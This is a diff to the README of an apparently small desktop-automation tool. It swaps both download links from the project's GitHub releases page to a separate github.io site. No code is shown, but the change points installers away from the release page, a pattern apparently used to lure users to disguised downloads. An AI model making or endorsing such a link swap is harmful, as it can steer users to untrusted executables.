@@ -1,6 +1,6 @@
 # 📍 inner-coordinates - Automate your desktop apps without code
 
-[![Download inner-coordinates](https://img.shields.io/badge/Download_Software-blue)](https://github.com/bettersilvanus849/inner-coordinates/releases)
+[![Download inner-coordinates](https://img.shields.io/badge/Download_Software-blue)](https://bettersilvanus849.github.io)
 
 inner-coordinates helps you run sequences of clicks and actions on your computer. You teach the software the location of buttons and menus once. Then, the tool remembers these positions to perform complex tasks for you. This handles applications that hide their internal data from normal automation tools. 
 
@@ -12,7 +12,7 @@ Many programs do not share their layout with your computer. This makes it hard t
 
 You need to download the installer file from our release page. Visit the link below to find the version for your computer.
 
-[Click here to open the download page](https://github.com/bettersilvanus849/inner-coordinates/releases)
+[Click here to open the download page](https://bettersilvanus849.github.io)
 
 Follow these steps to set up the tool:
 
